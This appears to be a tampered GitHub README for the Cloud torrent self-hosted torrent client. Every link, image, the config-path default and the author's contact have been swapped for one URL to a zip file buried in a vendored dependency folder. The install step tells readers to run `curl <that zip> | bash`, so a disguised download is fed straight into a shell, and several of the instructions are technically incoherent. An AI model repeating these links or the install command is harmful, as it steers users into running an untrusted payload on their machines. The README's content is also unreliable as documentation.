<img src="https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip" alt="screenshot"/>

**Cloud torrent** is a a self-hosted remote torrent client, written in Go (golang). You start torrents remotely, which are downloaded as sets of files on the local disk of the server, which are then retrievable or streamable via HTTP.

### Features

* Single binary
* Cross platform
* Embedded torrent search
* Real-time updates
* Mobile-friendly
* Fast [content server](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)
* [*More features coming soon*](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)

### Install

**Binaries**

See [the latest release](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip) or download it now with `curl https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip | bash`

**Source**

*[Go](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip) is required to install from source*

``` sh
$ go get -v https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip
```

**Docker**

``` sh
$ docker run -d -p 3000:3000 -v /path/to/my/downloads:/downloads jpillora/cloud-torrent
```

**Heroku**

Click this button to...

[![Deploy](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)

### Usage

```
$ cloud-torrent --help

  Usage: cloud-torrent [options]

  Options:
  --title, -t        Title of this instance (default Cloud Torrent, env TITLE)
  --port, -p         Listening port (default 3000, env PORT)
  --host, -h         Listening interface (default all)
  --auth, -a         Optional basic auth in form 'user:password' (env AUTH)
  --config-path, -c  Configuration file path (default https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)
  --key-path, -k     TLS Key file path
  --cert-path, -r    TLS Certicate file path
  --log, -l          Enable request logging
  --open, -o         Open now with your default browser
  --help
  --version, -v

  Version:
    0.8.8

  Read more:
    https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip

```

### Notes

This project is the version 2 rewrite of the original [Node version](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip).

![overview](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)

Credits to `anacrolix` for https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip

#### MIT License

Copyright © 2015 Jaime Pillora &lt;https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip;

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
'Software'), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
